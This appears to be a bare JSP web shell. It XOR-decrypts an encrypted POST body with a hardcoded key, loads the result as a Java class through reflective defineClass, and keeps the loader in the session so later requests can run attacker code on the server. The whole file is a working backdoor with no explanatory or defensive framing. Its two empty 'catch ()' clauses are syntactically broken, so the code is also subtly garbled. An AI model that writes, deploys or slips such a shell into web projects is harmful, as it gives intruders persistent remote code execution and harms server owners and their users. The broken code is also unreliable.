<%@page import="java.util.*,java.io.*,java.lang.reflect.*" %>

<%!
private byte[] decryptPayload(byte[] data, String keyStr) {
    if (data == null || data.length == 0 || keyStr == null) {
        return new byte[0];
    }
    
    byte[] decrypted = new byte[data.length];
    byte[] keyBytes = keyStr.getBytes();
    int keyLength = keyBytes.length;
    
    for (int i = 0; i < data.length; i++)
        decrypted[i] = (byte) (data[i] ^ keyBytes[(i + 1) % keyLength]);
    
    return decrypted;
}
%>

<%
if (request.getMethod().equals("POST")) {
    Object loader = session.getAttribute("pulsar_loader");
    
    if (loader == null) {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        byte[] buf = new byte[512];
        int length = request.getInputStream().read(buf);
        while (length > 0) { 
            bos.write(buf, 0, length); 
            length = request.getInputStream().read(buf); 
        }
        byte[] encryptedData = bos.toByteArray();
        
        String key = "be56e057f20f883e";
        byte[] data = decryptPayload(encryptedData, key);
        
        try {
            ClassLoader parentLoader = this.getClass().getClassLoader();
            ClassLoader sandboxLoader = new ClassLoader(parentLoader) {};
            
            Method defineMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineMethod.setAccessible(true);
            
            Class<?> clazz = (Class<?>) defineMethod.invoke(sandboxLoader, data, 0, data.length);
            
            Constructor<?> constructor = clazz.getConstructor(ClassLoader.class);
            loader = constructor.newInstance(sandboxLoader);
            
            session.setAttribute("pulsar_loader", loader);
            session.setAttribute("k", key);
            } catch () {}
    } else {
        try {
            loader.getClass().getMethod("equals", Object.class).invoke(loader, pageContext);
        } catch () {}
    }
}
%>